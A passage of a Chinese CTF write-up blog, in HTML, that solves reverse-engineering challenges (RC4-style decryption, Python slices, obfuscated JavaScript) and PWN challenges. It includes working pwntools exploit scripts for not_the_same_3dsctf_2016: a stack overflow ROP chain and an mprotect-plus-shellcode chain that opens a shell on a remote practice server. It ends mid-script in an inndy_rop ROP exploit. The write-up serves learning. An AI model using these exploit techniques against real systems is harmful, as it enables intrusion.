class="number">151</span>, <span class="number">110</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">2</span>, <span class="number">234</span>, <span class="number">59</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">254</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> s3[] = &#123;</span><br><span class="line">        <span class="number">198</span>, <span class="number">33</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">228</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">143</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">193</span>,</span><br><span class="line">        <span class="number">235</span>, <span class="number">165</span>, <span class="number">52</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">178</span>, <span class="number">168</span>,</span><br><span class="line">        <span class="number">47</span>, <span class="number">244</span>, <span class="number">81</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">204</span>, <span class="number">51</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">214</span>, <span class="number">202</span>, <span class="number">236</span>, <span class="number">212</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">45</span>;</span><br><span class="line">    <span class="type">uint8_t</span> s[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">0</span>, v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v6 = (v6 + key2_origin[v5]) % <span class="number">256</span>;</span><br><span class="line">        swap(key2_origin + v5, key2_origin + v6);</span><br><span class="line">        s[i] = s3[i] ^ (key2_origin[((<span class="type">int</span>) key2_origin[v5] + key2_origin[v6]) % <span class="number">256</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行的结果是一样的:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807225943226.png" alt="image-20230807225943226"></p><p>然后复制到python的解密脚本中转换成utf-8的字符串就行,不过貌似没有base64的事…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = []</span><br><span class="line">data = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="built_in">str</span> += <span class="built_in">chr</span>(<span class="built_in">int</span>(i))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\devtools\venu\Scripts\python.exe D:\Data\CTF\do\re_run.py </span><br><span class="line"><span class="number">110</span> <span class="number">49</span> <span class="number">98</span> <span class="number">111</span> <span class="number">111</span> <span class="number">107</span> <span class="number">123</span> <span class="number">117</span> <span class="number">115</span> <span class="number">49</span> <span class="number">110</span> <span class="number">71</span> <span class="number">95</span> <span class="number">102</span> <span class="number">51</span> <span class="number">97</span> <span class="number">116</span> <span class="number">117</span> <span class="number">114</span> <span class="number">51</span> <span class="number">115</span> <span class="number">95</span> <span class="number">55</span> <span class="number">111</span> <span class="number">95</span> <span class="number">100</span> <span class="number">101</span> <span class="number">55</span> <span class="number">101</span> <span class="number">114</span> <span class="number">109</span> <span class="number">49</span> <span class="number">110</span> <span class="number">51</span> <span class="number">95</span> <span class="number">52</span> <span class="number">108</span> <span class="number">103</span> <span class="number">48</span> <span class="number">114</span> <span class="number">105</span> <span class="number">55</span> <span class="number">104</span> <span class="number">109</span> <span class="number">125</span></span><br><span class="line">[<span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;98&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;107&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;117&#x27;</span>, <span class="string">&#x27;115&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;102&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;97&#x27;</span>, <span class="string">&#x27;116&#x27;</span>, <span class="string">&#x27;117&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;115&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;101&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;101&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;110&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;108&#x27;</span>, <span class="string">&#x27;103&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;114&#x27;</span>, <span class="string">&#x27;105&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;104&#x27;</span>, <span class="string">&#x27;109&#x27;</span>, <span class="string">&#x27;125&#x27;</span>]</span><br><span class="line">n1book&#123;us1nG_f3atur3s_7o_de7erm1n3_4lg0ri7hm&#125;</span><br></pre></td></tr></table></figure><p>结束…</p><h2 id="slices">slices</h2><p>这题简单…因为没题干把题目的源代码也放上来吧…</p><p>题目代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Enter flag: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fail</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong!&#x27;</span>)</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">32</span>: fail()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag[:<span class="number">5</span>] != <span class="string">&#x27;hope&#123;&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[-<span class="number">1</span>] != <span class="string">&#x27;&#125;&#x27;</span>: fail()</span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">5</span>::<span class="number">3</span>] != <span class="string">&#x27;i0_tnl3a0&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">4</span>::<span class="number">4</span>] != <span class="string">&#x27;&#123;0p0lsl&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">3</span>::<span class="number">5</span>] != <span class="string">&#x27;e0y_3l&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">6</span>::<span class="number">3</span>] != <span class="string">&#x27;_vph_is_t&#x27;</span>: fail() </span><br><span class="line"><span class="keyword">if</span> flag[<span class="number">7</span>::<span class="number">3</span>] != <span class="string">&#x27;ley0sc_l&#125;&#x27;</span>: fail() </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Congrats!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag is: &#x27;</span>, flag)</span><br></pre></td></tr></table></figure><p>就这么简单,写个脚本就行了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="string">&#x27;0&#x27;</span>] * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">source, start, end, step</span>):</span><br><span class="line">    idx = start</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(source)):</span><br><span class="line">        flag[idx] = source[i]</span><br><span class="line">        idx += step</span><br><span class="line">        <span class="keyword">if</span> idx &gt;= end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">go(<span class="string">&#x27;hope&#123;&#x27;</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line">go(<span class="string">&#x27;i0_tnl3a0&#x27;</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">go(<span class="string">&#x27;&#123;0p0lsl&#x27;</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">4</span>)</span><br><span class="line">go(<span class="string">&#x27;e0y_3l&#x27;</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>)</span><br><span class="line">go(<span class="string">&#x27;_vph_is_t&#x27;</span>, <span class="number">6</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">go(<span class="string">&#x27;ley0sc_l&#125;&#x27;</span>, <span class="number">7</span>, <span class="number">32</span>, <span class="number">3</span>)</span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag_str)</span><br></pre></td></tr></table></figure><p>不出意外的话答案应该没啥问题…(解密脚本写的不咋地…)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807233325281.png" alt="image-20230807233325281"></p><p>hope{i_l0ve_pyth0n_slic3s_a_l0t}</p><p>结束…</p><h2 id="super-anti-scalper-solution-9000">super anti scalper solution 9000</h2><p>这个题就是JS混淆,代码很简单,我们其实只需要一件事:</p><p>​JS中任何对象都是true…</p><p>还有一件事:</p><p>​!![]把[]转换为布尔值,又[]是一个对象,所以他是true,然后!取反,!再取反,所以!![]的值就是true</p><p>还有一件事:</p><p>​!![]+!![]对2个true进行相加,显然true是1,那么答案就是1+1</p><p>所以首先就把!![]全部换成1,方便查看:<s>其实不替换也行…</s></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808095802372.png" alt="image-20230808095802372"></p><p>很显然,输入的字符串就是n,然后在第27行进行了比较,所以其实直接把27行n===后面那一串输出就行…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808100000896.png" alt="image-20230808100000896"></p><p>运行结果(记得按一下按钮):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808103948072.png" alt="image-20230808103948072" style="zoom:45%;" /><p>hope{sHoe_1ddbf55508afcc08_sold!}</p><p>结束…</p><h2 id="open-source">open-source</h2><p>这题…给了代码…那就不是题了…</p><p>解释直接放注释了,运行出来的结果就是flag:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123; <span class="comment">//3个参数 51966 25 h4cky0u</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;<span class="comment">//51966</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;<span class="comment">//25</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230808105306027.png" alt="image-20230808105306027"></p><p>结束…</p><h1 id="pwn">PWN</h1><h2 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h2><p>我只能说这个题对于我有点新了…貌似有两个做法,但是第一个做法那个exit()不太会搞,先放了吧…</p><h3 id="方法一">方法一</h3><p>这个题,乍一看是一个ret2next,但是…一开始本地能跑通,远程不过…后续发现大概是缓冲区刷新的问题,于是让printf继续返回到exit()以进行缓冲区刷新即可通过</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809114710444.png" alt="image-20230809114710444"></p><p>开幕雷击(爽击)…gets()就躺在那里,所以我们肯定是要从main开始ret,不过注意一个问题,那就是没有push ebp了(具体去看main的汇编)</p><p>但是除此之外没有调用任何的函数,那就去找吧,去尝试找&quot;flag&quot;字符串发现第一个就是,然后双击过去到汇编(?),接下来按Ctrl+x快捷键跳转到使用了这个字符串的函数,发现是一个get_secret()函数:</p><p>有一个flag.txt文件相关的字符串:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115015923.png" alt="image-20230809115015923"></p><p>双击过去:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115051406.png" alt="image-20230809115051406"></p><p>ctrl+x跳转,然后f5查看:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809115244164.png" alt="image-20230809115244164"></p><p>这个函数将flag.txt写入了fl4g这个地方(可寻址),那么我们接下来的事就是想办法跳转到get_secret()然后再用printf或者write之类的输出就行:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">getflag_addr = <span class="number">0x080489A0</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(getflag_addr)</span><br><span class="line"><span class="comment">#payload += p32(printf_addr) + p32(1) + p32(flag_addr)</span></span><br><span class="line">payload += p32(printf_addr) + p32(exit_addr) + p32(flag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>本地创建一个flag.txt测试一下没问题,然后把p32(1)改成p32(exit_addr),远程也能通过了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809131447147.png" alt="image-20230809131447147"></p><p>或者这样用fflush也行,不过那个stdout的地址不是直接找到的那个,调试找出来的,先记录一下再说:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">getflag_addr = <span class="number">0x080489A0</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line">fflush_addr = <span class="number">0x0804F3A0</span></span><br><span class="line">stdout_addr = <span class="number">0x80EB200</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x4006b3 #64位用到</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(getflag_addr)</span><br><span class="line">payload += p32(printf_addr) + p32(fflush_addr) + p32(flag_addr)</span><br><span class="line"><span class="comment"># payload += p32(printf_addr) + p32(exit_addr) + p32(flag_addr)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(stdout_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个用fflush也行,就是stdout这个文件指针一下子没找到正确的那个</p><h3 id="方法二">方法二</h3><p>这个应该是正解吧…或者可能是出题人疏忽了没搞三件套?(啥是三件套QWQ)</p><p>ret2shell的做法:</p><p>首先用checksec看看,发现有NX保护</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809132028022.png" alt="image-20230809132028022"></p><p>然后IDA中发现了mprotect():</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809131755622.png" alt="image-20230809131755622"></p><p>int mprotect(void *addr, size_t len, int prot)</p><p>三个参数分别是修改的起始地址，长度，修改为的权限</p><p>首先用这个函数去把.bss提权为可写权限(直接用7就行)</p><p>然后利用read进行shellcode的植入(read函数进行unix的读写)</p><p>接着就跳转到shellcode的位置进行getshell即可</p><p>注意:因为参数为3个,所以需要一个pop三连+ret的指令,这里用</p><p><code>ROPgadget --binary not_the_same_3dsctf_2016 --only 'pop|ret' | grep pop</code></p><p>来获取,随便一个就行,例如:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230809134557805.png" alt="image-20230809134557805" style="zoom:45%;" /><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25763</span>)</span><br><span class="line">mprotect_addr = <span class="number">0x0806ED40</span></span><br><span class="line"><span class="comment"># getflag_addr = 0x080489A0</span></span><br><span class="line"><span class="comment"># flag_addr = 0x080ECA2D</span></span><br><span class="line">pppr_addr = <span class="number">0x0806fcf0</span>  <span class="comment"># 使用ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27; | grep pop取得</span></span><br><span class="line">bss_addr = <span class="number">0x080EB000</span></span><br><span class="line">size = <span class="number">0x1000</span></span><br><span class="line">read_addr = <span class="number">0x0806E200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mprotect</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2d</span> + <span class="number">4</span> * <span class="number">0</span>) + p32(mprotect_addr) + p32(pppr_addr) + p32(bss_addr) + p32(size) + p32(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># read --- 从stdin(0)即标准输入读取到bss_addr中</span></span><br><span class="line">payload += p32(read_addr) + p32(pppr_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(size)</span><br><span class="line"><span class="comment"># run shellcode</span></span><br><span class="line">payload+=p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一直进行到read准备getshell</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode的读取(asm函数百度来的...)</span></span><br><span class="line">payload1=asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参见:</p><p><a href="https://blog.csdn.net/Kata_Jhin/article/details/129540833?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22129540833%22%2C%22source%22%3A%22Kata_Jhin%22%7D">https://blog.csdn.net/Kata_Jhin/article/details/129540833?csdn_share_tail={&quot;type&quot;%3A&quot;blog&quot;%2C&quot;rType&quot;%3A&quot;article&quot;%2C&quot;rId&quot;%3A&quot;129540833&quot;%2C&quot;source&quot;%3A&quot;Kata_Jhin&quot;}</a></p><p>(不是一个题,但是做法差不多一样…)</p><p>结束…</p><h2 id="inndy-rop">inndy_rop</h2><p>这道题是rop…ret2syscall…</p><p>ROPgadget是真的好用啊…</p><p>那么我正好看了某个文章:</p><p><a href="https://repw.github.io/2018/10/27/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8BROP%E5%9F%BA%E7%A1%80/#undefined">https://repw.github.io/2018/10/27/栈溢出之ROP基础/#undefined</a></p><p>关于系统调用号:</p><p>​截图取自:<a href="https://blog.csdn.net/kaiandshan/article/details/44587225">https://blog.csdn.net/kaiandshan/article/details/44587225</a></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230812235944050.png" alt="image-20230812235944050" style="zoom: 50%;" /></p><h3 id="题目分析">题目分析:</h3><p>代码非常简单,直接从一个overflow函数中gets()溢出,但是发现没有system()这些可利用的东西</p><p>所以是一个rop的题,那么既然是rop,就去用ROPgadget找rop</p><p>首先,最粗暴的方法就是直接用ROPgadget的一个奇葩功能直接生成shellcode,然后粘贴进脚本,加上偏移就行…</p><p><code>ROPgadget --binary rop --ropchain</code></p><p>使用该命令就会自动生成rop链,粘贴进脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># 记得要加上pack这个模块的引用,因为shellcode要用到</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27861</span>)</span><br><span class="line"><span class="comment"># 